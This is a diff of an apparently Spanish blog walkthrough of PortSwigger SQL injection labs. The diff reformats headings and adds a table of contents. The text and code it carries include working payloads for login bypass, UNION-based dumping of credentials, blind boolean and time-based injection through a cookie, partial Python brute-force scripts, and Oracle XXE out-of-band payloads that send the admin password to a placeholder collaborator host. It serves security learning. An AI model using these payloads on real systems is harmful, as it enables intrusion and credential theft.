@@ -229,7 +229,54 @@ SELECT * FROM products WHERE category = &amp;lsquo;%s&amp;rsquo; AND released =1
     </ol>
 </aside>
 
-    
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Tabla de contenido</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#lab-1-sql-injection-vulnerability-in-where-clause-allowing-retrival-of-hidden-data">LAB 1: SQL injection vulnerability in WHERE clause allowing retrival of hidden data</a></li>
+    <li><a href="#lab-2-sql-injection-vulnerability-allowing-login-bypass">LAB 2: SQL injection vulnerability allowing login bypass</a></li>
+    <li><a href="#lab-3-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">LAB 3: SQL injection UNION attack, determining the number of columns returned by the query</a></li>
+    <li><a href="#lab-4-sql-injection-union-attack-finding-a-columng-containing-text">LAB 4: SQL injection UNION attack, finding a columng containing text</a></li>
+    <li><a href="#lab-5-sql-injection-union-attack-retriving-data-from-other-tables">LAB 5: SQL injection UNION attack, retriving data from other tables</a></li>
+    <li><a href="#lab-6-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">LAB 6: SQL injection UNION attack, retrieving multiple values in a single column</a></li>
+    <li><a href="#lab-7-sql-injection-attack-querying-the-database-type-and-version-on-oracle">LAB 7: SQL injection attack, querying the database type and version on Oracle</a></li>
+    <li><a href="#lab-8-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">LAB 8: SQL injection attack, querying the database type and version on MySQL and Microsoft</a></li>
+    <li><a href="#lab-9-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">LAB 9: SQL injection attack, listing the database contents on non-Oracle databases</a></li>
+    <li><a href="#lab-10-sql-injection-attack-listing-the-database-contents-on-oracle-databases">LAB 10: SQL injection attack, listing the database contents on Oracle databases</a></li>
+    <li><a href="#lab-11-blind-sql-injection-with-conditional-responses">LAB 11: Blind SQL injection with conditional responses</a></li>
+    <li><a href="#lab-12-blind-sql-injection-with-conditional-errors">LAB 12: Blind SQL injection with conditional errors</a></li>
+    <li><a href="#lab-13-blind-sql-injection-with-time-delays">LAB 13: Blind SQL injection with time delays</a></li>
+    <li><a href="#lab-14-blind-sql-injection-with-time-delays-and-information-retrieval">LAB 14: Blind SQL injection with time delays and information retrieval</a></li>
+    <li><a href="#lab-15-blind-sql-injection-with-out-of-band-interaction">LAB 15: Blind SQL injection with out-of-band interaction</a></li>
+    <li><a href="#lab-16-blind-sql-injection-with-out-of-band-data-exfiltration">LAB 16: Blind SQL injection with out-of-band data exfiltration</a></li>
+    <li><a href="#lab-17-sql-injection-with-filter-bypass-via-xml-enconding">LAB 17: SQL injection with filter bypass via XML enconding</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
 
             <main class="main full-width">
     <article class="main-article">
@@ -300,13 +347,7 @@ SELECT * FROM products WHERE category = &amp;lsquo;%s&amp;rsquo; AND released =1
     <section class="article-content">
     
     
-    <div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 1: SQL injection vulnerability in WHERE clause allowing retrival of hidden data</th>
-</tr>
-</thead>
-</table></div>
+    <h2 id="lab-1-sql-injection-vulnerability-in-where-clause-allowing-retrival-of-hidden-data">LAB 1: SQL injection vulnerability in WHERE clause allowing retrival of hidden data</h2>
 <p>El laboratorio tiene una vulnerabilidad de SQLi en el filtro de categorias de los productos.</p>
 <p>La pagina tramita por detras una peticion SQL que es la siguiente:</p>
 <p>SELECT * FROM products WHERE category = &lsquo;Gifts&rsquo; AND released =1;</p>
@@ -320,15 +361,9 @@ http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; or 1=1&ndash; -</p>
 <p>La consulta que se tramitaria por detras seria la siguiente:</p>
 <p>SELECT * FROM productos WHERE category = &lsquo;Pets&rsquo; or 1=1&ndash; -&rsquo; AND released=1;</p>
 <p>Por lo que como la validación de 1=1 es correcta va a coger todas las categorias existentes como validas y las va a mostar todas junto con los articulos no publicados.</p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 2: SQL injection vulnerability allowing login bypass</th>
-</tr>
-</thead>
-</table></div>
+<h2 id="lab-2-sql-injection-vulnerability-allowing-login-bypass">LAB 2: SQL injection vulnerability allowing login bypass</h2>
 <p>El laboratorio tiene una vulnerabilidad de SQLi en el login de la pagina.</p>
-<p>La query que puede esatr tramitando la pagina por detras podria ser algo así:</p>
+<p>La query que puede estar tramitando la página por detras podría ser algo así:</p>
 <p>SELECT nombre,apellido FROM users WHERE username = &lsquo;administrator&rsquo; AND password = &lsquo;pass123&rsquo;;</p>
 <p>SELECT nombre,apellido FROM users WHERE username = &lsquo;%s&rsquo; AND password = &lsquo;%s&rsquo;;</p>
 <blockquote>
@@ -342,13 +377,7 @@ xxx</p>
 <p>La consulta que se tramitaria por detras seria la siguiente:</p>
 <p>SELECT nombre,apellido FROM users WHERE username = &lsquo;administrator&rsquo;&ndash; -&rsquo; AND password = &lsquo;xxx&rsquo;;</p>
 <p>Esto sucede debido a que en esta consulta estamos comentando la parte de la contraseña por lo que no la tiene en cuenta a la hora de validar la consulta, y como el username de administrator existe la consulta es válida por lo que el login como administrador se puede llevar a cabo.</p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 3: SQL injection UNION attack, determining the number of columns returned by the query</th>
-</tr>
-</thead>
-</table></div>
+<h2 id="lab-3-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">LAB 3: SQL injection UNION attack, determining the number of columns returned by the query</h2>
 <p>El laboratorio tiene una vulnerabilidad de SQLi en el filtro de categorias.</p>
 <p>En este caso primero vamos a averiguar cuantas columnas existen para la tabla en la que nos encontramos, para ello vamos a usar un <code>order by</code>  y tartar de encontrar las columnas a base de prueba y error en la pagina de la siguiente manera. El <code>order by</code> depende de los campos que se engloben en el SELECT.</p>
 <p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; order by 100&ndash; -</p>
@@ -357,117 +386,69 @@ xxx</p>
 <p>Al comprobar que son 3 gracias a que la pagina lo interpreta como bueno y muestra contenido sin error la sieguiente parte es usar UNION SELECT para combinar datos.</p>
 <p>En este caso usamos NULL ya que la web no nos permite ponerlo con numeros que se cambiarian por los NULLs de esta forma: union select 1,2,3&ndash; -</p>
 <p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,NULL,NULL&ndash; -</p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 4: SQL injection UNION attack, finding a columng containing text</th>
-</tr>
-</thead>
-</table></div>
+<h2 id="lab-4-sql-injection-union-attack-finding-a-columng-containing-text">LAB 4: SQL injection UNION attack, finding a columng containing text</h2>
 <p>En este lab simplemente tenemos que hacer lo mismo pero esta vez queremos mostrar una cadena personalizada en la web gracias a los campos NULLs que tenemos. No todos los campos son inyectables, a veces hay que fuzzear y buscar de cual de ellos nos podemos aprovechar para sacar información de ellos.</p>
 <p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,&rsquo;texto&rsquo;,NULL&ndash; -</p>
 <p>Esto hará que en la respuesta del servidor veamos en la web la palabra texto que hemos definido arriba.</p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 5: SQL injection UNION attack, retriving data from other tables</th>
-</tr>
-</thead>
-</table></div>
+<h2 id="lab-5-sql-injection-union-attack-retriving-data-from-other-tables">LAB 5: SQL injection UNION attack, retriving data from other tables</h2>
 <p>Este laboratorio trata de poder volcar información de otras tablas para poder conseguir datos del usuario administrador poder conectarnos como él.</p>
-<p>Primero de todo vemos la cantidad de columnas que se tratan de golpe con el UNION SELECT saltándonos el paso del <code>order by</code>.
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select NULL,NULL&ndash; -</p>
-<p>Y comprobamos cual de estos dos campos es inyectable, ambos lo son, pero para practicar lo vamos a hacer solo con uno.
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select &rsquo;test&rsquo;,NULL&ndash; -</p>
-<p>Ahora vamos a comprobar las bases de datos existentes de la siguiente manera:
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select schema_name,NULL from information_schema.schemata&ndash; -</p>
-<p>Una vez sabiendos las bases de datos procedemos a enumerar las tablas de la base de datos que seleccionemos. <code>table_schema</code> es para indicar el nombre de la base de datos
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select table_name,NULL from information_schema.tables where table_schema=&lsquo;public&rsquo;&ndash; -</p>
+<p>Primero de todo vemos la cantidad de columnas que se tratan de golpe con el UNION SELECT saltándonos el paso del <code>order by</code>.</p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select NULL,NULL&ndash; -</p>
+<p>Y comprobamos cual de estos dos campos es inyectable, ambos lo son, pero para practicar lo vamos a hacer solo con uno.</p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select &rsquo;test&rsquo;,NULL&ndash; -</p>
+<p>Ahora vamos a comprobar las bases de datos existentes de la siguiente manera:</p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select schema_name,NULL from information_schema.schemata&ndash; -</p>
+<p>Una vez sabiendos las bases de datos procedemos a enumerar las tablas de la base de datos que seleccionemos. <code>table_schema</code> es para indicar el nombre de la base de datos</p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select table_name,NULL from information_schema.tables where table_schema=&lsquo;public&rsquo;&ndash; -</p>
 <p>Ahora porcedemos a sacar las columnas de la base de datos public y de la tabla users:
-<code>table_name</code> es para indicar el nombre de la tabla.
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select column_name,NULL from information_schema.colums where table_schema=&lsquo;public&rsquo; and table_name=&lsquo;users&rsquo;&ndash; -</p>
+<code>table_name</code> es para indicar el nombre de la tabla.</p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select column_name,NULL from information_schema.colums where table_schema=&lsquo;public&rsquo; and table_name=&lsquo;users&rsquo;&ndash; -</p>
 <p>Ya que tenemos todo lo necesario, podemos obtener los datos que estabamos buscando.
-<code>group_concat()</code>  es para poder mostar ambos datos en una misma fila y poder verlos mejor representados. Tambien se puede con <code>concat()</code>
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select group_concat(username,&rsquo;:&rsquo;,password),NULL from users&ndash; -</p>
-<p>Si la base de datos que está actualmente en uso no es la que contiene los datos que deseamos obtener es necesario que la indiquemos de la siguiente manera: poniendo la base de datos delante de la tabla y después un punto: <code>public.users</code>
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select group_concat(username,&rsquo;:&rsquo;,password),NULL from public.users&ndash; -</p>
-<p>Si <code>group_concat</code> no funciona se pueden concatenar los datos de otra manera:
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select username||&rsquo;:&rsquo;||password,NULL from public.users&ndash; -</p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 6: SQL injection UNION attack, retrieving multiple values in a single column</th>
-</tr>
-</thead>
-</table></div>
+<code>group_concat()</code>  es para poder mostar ambos datos en una misma fila y poder verlos mejor representados. Tambien se puede con <code>concat()</code></p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select group_concat(username,&rsquo;:&rsquo;,password),NULL from users&ndash; -</p>
+<p>Si la base de datos que está actualmente en uso no es la que contiene los datos que deseamos obtener es necesario que la indiquemos de la siguiente manera: poniendo la base de datos delante de la tabla y después un punto: <code>public.users</code></p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select group_concat(username,&rsquo;:&rsquo;,password),NULL from public.users&ndash; -</p>
+<p>Si <code>group_concat</code> no funciona se pueden concatenar los datos de otra manera:</p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select username||&rsquo;:&rsquo;||password,NULL from public.users&ndash; -</p>
+<h2 id="lab-6-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">LAB 6: SQL injection UNION attack, retrieving multiple values in a single column</h2>
 <p>En este caso queremos ver toda la información en una única columna, asique es prácticamente lo mismo que el laboratorio anterior.</p>
 <p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select username||&rsquo;:&rsquo;||password,NULL from users&ndash; -</p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 7: SQL injection attack, querying the database type and version on Oracle</th>
-</tr>
-</thead>
-</table></div>
-<p>En este laboratorio se nos pide que saquemos solamente la informacion sobre la versión de Oracle</p>
-<p>Es necesario poner <code>from dual</code> ya que es una tabla especial que aparece en todas las bases de datos de oracle. Esto nos vale para comprobar si estamos trabajando con Oracle.
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Accessories&rsquo; union select NULL,NULL from dual&ndash; -</p>
-<p>Ahora que ya sabemos que estamos trabajando con Oracle porcedemos a sacar la version en la que se encuentra, para ellos es necesario poner <code>SELECT banner FROM v\$version</code> o <code>SELECT version FROM v$instance</code>
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Accessories&rsquo; union select NULL,banner from v$version&ndash; -</p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 8: SQL injection attack, querying the database type and version on MySQL and Microsoft</th>
-</tr>
-</thead>
-</table></div>
+<h2 id="lab-7-sql-injection-attack-querying-the-database-type-and-version-on-oracle">LAB 7: SQL injection attack, querying the database type and version on Oracle</h2>
+<p>En este laboratorio se nos pide que saquemos solamente la informacion sobre la versión de Oracle.</p>
+<p>Es necesario poner <code>from dual</code> ya que es una tabla especial que aparece en todas las bases de datos de oracle. Esto nos vale para comprobar si estamos trabajando con Oracle.</p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Accessories&rsquo; union select NULL,NULL from dual&ndash; -</p>
+<p>Ahora que ya sabemos que estamos trabajando con Oracle porcedemos a sacar la version en la que se encuentra, para ellos es necesario poner <code>SELECT banner FROM v\$version</code> o <code>SELECT version FROM v$instance</code></p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Accessories&rsquo; union select NULL,banner from v$version&ndash; -</p>
+<h2 id="lab-8-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">LAB 8: SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>
 <p>En este caso es lo mismo que en el anterior. Sacar la version de una base de datos Mysql y Microsoft ya que en ambas se obtiene de la misma manera.</p>
 <p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Gifts&rsquo; union select NULL,@@version&ndash; -</p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 9: SQL injection attack, listing the database contents on non-Oracle databases</th>
-</tr>
-</thead>
-</table></div>
+<h2 id="lab-9-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">LAB 9: SQL injection attack, listing the database contents on non-Oracle databases</h2>
 <p>En este laboratorio se nos pide básicamente los mismo que en uno de los anteriores, simplemente obtener la password del usuario administrator y conectarnos con su cuenta, para ello es necesario primero investigar y sacar la base de datos, tabla y columnas necesarias para obtener dicha password.</p>
 <p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,NULL&ndash; -</p>
 <p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select schema_name,NULL from information_schema.schemata&ndash; -</p>
 <p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select table_name,NULL from information_schema.tables where table_schema=&lsquo;public&rsquo;&ndash; -</p>
 <p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select column_name,NULL from information_schema.columns where table_schema=&lsquo;public&rsquo; and table_name=&lsquo;nombre_tabla&rsquo;&ndash; -</p>
 <p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select username_xxx||&rsquo;:&rsquo;||password_xxx,NULL from users_xxx&ndash; -</p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 10: SQL injection attack, listing the database contents on Oracle databases</th>
-</tr>
-</thead>
-</table></div>
+<h2 id="lab-10-sql-injection-attack-listing-the-database-contents-on-oracle-databases">LAB 10: SQL injection attack, listing the database contents on Oracle databases</h2>
 <p>Este laboratorio consiste en los mismo que el anterior pero en este caso con una base de datos de Oracle, por lo que los pasos serán los mismos pero con una estructura un poco diferente.</p>
 <p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,NULL from dual&ndash; -</p>
-<p>De esta forma vamos a mostrar todas las tablas de todas las bases de datos
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,table_name from all_tables&ndash; -</p>
-<p>Con <code>owners</code> vamos a mostrar propietarios
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,owners from all_tables&ndash; -
-De esta forma filtramos por las tablas del propietario que indiquemos
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,table_name from all_tables where owner=&lsquo;nombre_del_propietario&rsquo;&ndash; -</p>
-<p>Prosigamos con la obtención de las columnas de la siguiente manera: con <code>all_tab_columns</code> hacemos referencia a las columnas
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,column_name from all_tab_columns where table_name=&lsquo;users_xxx&rsquo;&ndash; -</p>
-<p>Y por últimos sacamos los datos username y password de la tabla users
-http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,username_xxx||&rsquo;:&rsquo;||password_xxx from users_xxx&ndash; -</p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 11: Blind SQL injection with conditional responses</th>
-</tr>
-</thead>
-</table></div>
+<p>De esta forma vamos a mostrar todas las tablas de todas las bases de datos.</p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,table_name from all_tables&ndash; -</p>
+<p>Con <code>owners</code> vamos a mostrar propietarios.</p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,owners from all_tables&ndash; -</p>
+<p>De esta forma filtramos por las tablas del propietario que indiquemos.</p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,table_name from all_tables where owner=&lsquo;nombre_del_propietario&rsquo;&ndash; -</p>
+<p>Prosigamos con la obtención de las columnas de la siguiente manera: con <code>all_tab_columns</code> hacemos referencia a las columnas.</p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,column_name from all_tab_columns where table_name=&lsquo;users_xxx&rsquo;&ndash; -</p>
+<p>Y por últimos sacamos los datos username y password de la tabla users.</p>
+<p>http://xxxxxxxxxxxxxxxxxxxxxxxxxxx?category=Pets&rsquo; union select NULL,username_xxx||&rsquo;:&rsquo;||password_xxx from users_xxx&ndash; -</p>
+<h2 id="lab-11-blind-sql-injection-with-conditional-responses">LAB 11: Blind SQL injection with conditional responses</h2>
 <p>En este laboratorio el campo inyectable no es el de la categoría, es en la cookie, específicamente en TrackingId. Hay un campo que se muestra en la página como &ldquo;Welcome back!&rdquo;, pues este desaparece dependiendo de la inyección que hagamos, provocando que sepamos cual funciona y cual no dependiendo de si el mensaje de &ldquo;Welcome back!&rdquo; desaparece o no.</p>
 <p>Para este lab vamos a necesitar tirar de burpsuite para hacerlo de manera mas cómodo al principio y después poder hacer un script en python que lo automatice.</p>
-<p>Para entenderlo mejor vamos a hacer el ejemplo de la query que puede estar corriendo por detrás.
-SELECT * FROM products WHERE TrackingId = &lsquo;xxxxxxxxx&rsquo;;</p>
+<p>Para entenderlo mejor vamos a hacer el ejemplo de la query que puede estar corriendo por detrás.</p>
+<p>SELECT * FROM products WHERE TrackingId = &lsquo;xxxxxxxxx&rsquo;;</p>
 <p>Vamos a ir escalando gradualmente hasta tener la query que nos permita sacar la password el usuario administrador la cual usaremos en el script.</p>
-<p>Para comenzar lo que haremos será la siguiente(Todo esto en el campo de l coockie TrakingId):
+<p>Para comenzar lo que haremos será la siguiente(Todo esto en el campo del coockie TrakingId):
 <code>TrackingId=xxxxxxxxxxx' and (select 'a' from users where username='administrator')='a-- -</code></p>
 <p>Aquí estamos filtrando por la letra &lsquo;a&rsquo; de administrator, como esta existe toda la query se va a convertir en una &lsquo;a&rsquo; por lo que va a quedar &lsquo;a&rsquo;=&lsquo;a y como esto es correcto vamos a ver el campo &lsquo;Welcome back!&rsquo; en la pagina lo que nos hará saber de que todo ha funcionado bien.</p>
 <p><code>TrackingId=xxxxxxxxxxx' and (select substring(username,1,1) from users where username='administrator')='a-- -</code></p>
@@ -570,21 +551,15 @@ En esta query lo que podemos es ir iterando sobre el primer numero de la funcion
 </span></span><span class="line"><span class="cl">	<span class="n">makeRequest</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 12: Blind SQL injection with conditional errors</th>
-</tr>
-</thead>
-</table></div>
+</div><h2 id="lab-12-blind-sql-injection-with-conditional-errors">LAB 12: Blind SQL injection with conditional errors</h2>
 <p>En este laboratorio no vamos a ver mensajes de respuesta pero si vamos a ver códigos de estados como el 500 internal server error o el 200 ok. El camp inyectable es otra vez en la cookie, por lo que si tiramos de burpsuite será mas cómodo.</p>
 <p>Si probamos querys básicas que hemos estado utilizando durante todos los laboratorios de portswigger vamos a ver que a veces nos salta el 500 internal server error y otra el 200 ok.
 Esto nos puede descuadrar un poco, pero lo que tenemos que hacer es seguir probando y ver con que tipo de base de datos nos estamos topando(MySql, Microsoft, Oracle, etc).</p>
-<p>Como la query que se esta tratando por detrás es algo así:
-SELECT * FROM products WHERE TrackingId = &lsquo;xxxxxxxxx&rsquo;;
-Vamos a probar una manera de poder mandar la query correctamente, concatenado querys con los || como en uno de los laboratorios que hicimos anteriormente.
-SELECT * FROM products WHERE TrackingId = &lsquo;xxxxxxxxx&rsquo;||(select &lsquo;&rsquo;)||&rsquo;&rsquo;;
-De la siguiente manera vamos a ver que estamos tratando con una base de datos Oracle gracias a la tabla &lsquo;dual&rsquo;</p>
+<p>Como la query que se esta tratando por detrás es algo así:</p>
+<p>SELECT * FROM products WHERE TrackingId = &lsquo;xxxxxxxxx&rsquo;;</p>
+<p>Vamos a probar una manera de poder mandar la query correctamente, concatenado querys con los || como en uno de los laboratorios que hicimos anteriormente.</p>
+<p>SELECT * FROM products WHERE TrackingId = &lsquo;xxxxxxxxx&rsquo;||(select &lsquo;&rsquo;)||&rsquo;&rsquo;;</p>
+<p>De la siguiente manera vamos a ver que estamos tratando con una base de datos Oracle gracias a la tabla &lsquo;dual&rsquo;</p>
 <p><code>TrackingId = xxxxxxxxx'||(select '' from dual)||';</code></p>
 <p>Ahora para poder ver si la tabla existe lo podemos comprobar de la siguiente manera. ROWNUM para quedarnos con una única fila en la respuesta:</p>
 <p><code>TrackingId = xxxxxxxxx'||(select '' from users where rownum=1)||';</code></p>
@@ -695,24 +670,12 @@ A si que lo que nosotros estamos buscando desde un principio es ver el estado 50
 </span></span><span class="line"><span class="cl">	<span class="n">makeRequest</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 13: Blind SQL injection with time delays</th>
-</tr>
-</thead>
-</table></div>
+</div><h2 id="lab-13-blind-sql-injection-with-time-delays">LAB 13: Blind SQL injection with time delays</h2>
 <p>En este laboratorio hay que conseguir que la web tarde 10s en responder.En este caso vamos a estar tratando con una base de datos PostgresSQL.</p>
 <p>El campo inyectable sigue siendo la cookie TrackingId, y ya no vamos a ver nada de respuesta ni errores que nos hagan ver si vamos por buen camino o no.</p>
 <p>La forma en la que PostgresSQL de hacer que la web en este caso tarde 10s en responder seria de la siguiente manera:</p>
 <p><code>TrackingId = xxxxxxxxx'||pg_sleep(10)-- -;</code></p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 14: Blind SQL injection with time delays and information retrieval</th>
-</tr>
-</thead>
-</table></div>
+<h2 id="lab-14-blind-sql-injection-with-time-delays-and-information-retrieval">LAB 14: Blind SQL injection with time delays and information retrieval</h2>
 <p>En este laboratorio vamos a tratar de sacar la contraseña del usuario administrador gracias al tiempo de respuesta de la web, como en el laboratorio anterior.</p>
 <p>Lo que vamos a tratar de hacer con esta query es algo similar a la que hicimos en el Lab12, simplemente cuando una condición se cumpla con los filtro que apliquemos la respuesta del servidor será de 5s, de lo contrario la respuesta será inmediata.</p>
 <p><code>TrackingId = xxxxxxxxx'||(select case when (1=1) then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- -;</code></p>
@@ -820,25 +783,13 @@ A si que lo que nosotros estamos buscando desde un principio es ver el estado 50
 </span></span><span class="line"><span class="cl">	<span class="n">makeRequest</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 15: Blind SQL injection with out-of-band interaction</th>
-</tr>
-</thead>
-</table></div>
-<p>Suponiendo que es oracle</p>
+</div><h2 id="lab-15-blind-sql-injection-with-out-of-band-interaction">LAB 15: Blind SQL injection with out-of-band interaction</h2>
+<p>Suponiendo que es oracle.</p>
 <p>En este laboratorio hay que tratar de causar un DNS lookup con la herramienta Burp Collaborator.</p>
-<p>Para que esto se pueda acontecer hay que irse a la pestaña &lsquo;Burp&rsquo;-&gt;&lsquo;Burp collaborator client&rsquo; le damos a copy to clipboard y después lo ponemos donde &lsquo;burp-colaborator-subdomain&rsquo;. y después urlencodearlo todo.
-==TrackingId = xxxxxxxxx&rsquo;||(SELECT EXTRACTVALUE(xmltype(&rsquo;<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]&gt;&rsquo;),&rsquo;/l&rsquo;) FROM dual)&ndash; -==</p>
+<p>Para que esto se pueda acontecer hay que irse a la pestaña &lsquo;Burp&rsquo;-&gt;&lsquo;Burp collaborator client&rsquo; le damos a copy to clipboard y después lo ponemos donde &lsquo;burp-colaborator-subdomain&rsquo;. y después urlencodearlo todo.</p>
+<p><code>TrackingId = xxxxxxxxx'||(SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;'),'/l') FROM dual)-- -</code></p>
 <p>Después mandamos la petición con el repeater y después volver a la pestaña de &lsquo;Burp collaborator client&rsquo; y darle a &lsquo;pull now&rsquo;, si vemos que hay una petición es que ha funcionado.</p>
-<div class="table-wrapper"><table>
-<thead>
-<tr>
-<th style="text-align:center">LAB 16: Blind SQL injection with out-of-band data exfiltration</th>
-</tr>
-</thead>
-</table></div>
+<h2 id="lab-16-blind-sql-injection-with-out-of-band-data-exfiltration">LAB 16: Blind SQL injection with out-of-band data exfiltration</h2>
 <p>Suponiendo que es Oracle.</p>
 <p>Aquí es simplemente lo mismo, poner el subdominio de burp donde pone &lsquo;burp-collaborator-subdomain&rsquo; y delate de eso donde pone &lsquo;select your query here&rsquo;  hay que poner la query que deseamos ejecutar para poder sacar datos como la contraseña del administrador. Y lo urlencodeamos.</p>
 <p><code>TrackingId = xxxxxxxxx'||(SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;'),'/l') FROM dual-- -</code></p>
@@ -850,13 +801,7 @@ A si que lo que nosotros estamos buscando desde un principio es ver el estado 50
